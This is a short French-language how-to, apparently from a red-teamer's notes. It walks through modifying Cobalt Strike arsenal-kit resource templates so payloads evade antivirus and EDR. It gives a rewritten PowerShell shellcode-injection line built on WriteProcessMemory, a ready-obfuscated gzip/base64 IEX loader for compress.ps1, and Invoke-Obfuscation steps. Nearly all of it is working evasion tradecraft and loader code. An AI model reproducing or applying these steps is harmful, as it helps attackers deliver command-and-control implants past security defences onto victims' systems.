1. Build les resources

```
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```

2. Dans VSCode ouvrir C:\Tools\cobaltstrike\custom-resources, modifier template.x64.ps1

3. Renommer les fonctions "func_get_proc_address" par "get_proc_address" et "func_get_delegate_type" par "get_delegate_type"

```
CTRL H + "func_" ""
```

4. remplacer Ligne 32 par : 

```
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll WriteProcessMemory), (get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```

5. Dans Compress.ps1, utiliser Invoke-Obfuscation pour obfusquer 
	ou directement 
```
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```


 Obfusquer le script avec Invoke-Obfuscation -> [[BYPASS AV - EDR#Invoke-Obfuscation]]

7. Importer le module.

```
Import-Module .\Invoke-Obfuscation.psd1
```

3. Lancer Invoke-Obfuscation

```
Invoke-Obfuscation
```


4. Set le script block à celui de compress.ps1

```
SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
```

3. Utiliser n'importe quelle méthode d'obfuscation sauf la méthode 'string'  (%%DATA%%  est nécessaire pour Cobalt Strike) et remplacer compress.ps1
4.   
    Open the Cobalt Strike client and load **resources.cna** from _C:\Tools\cobaltstrike\custom-resources_.
